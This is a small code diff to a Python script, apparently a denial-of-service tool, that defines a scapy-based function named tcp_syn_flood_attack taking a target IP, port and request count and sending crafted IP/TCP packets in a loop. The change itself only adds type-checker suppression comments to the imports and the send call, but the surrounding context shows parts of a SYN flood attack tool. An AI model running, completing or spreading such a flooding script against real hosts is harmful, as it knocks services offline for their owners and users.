@@ -3,8 +3,8 @@
 from random import randint
 from sys import stdout
 
-from scapy.all import *
-from scapy.layers.inet import IP, TCP
+from scapy.all import * # type: ignore
+from scapy.layers.inet import IP, TCP # type: ignore
 
 def tcp_syn_flood_attack(target_ip, target_port, num_requests):
     """
@@ -44,7 +44,7 @@ def tcp_syn_flood_attack(target_ip, target_port, num_requests):
             
             # Combine layers and send the packet
             packet = ip/tcp
-            send(packet, verbose=0)
+            send(packet, verbose=0) # type: ignore
             packets_sent += 1
             
             # Show progress
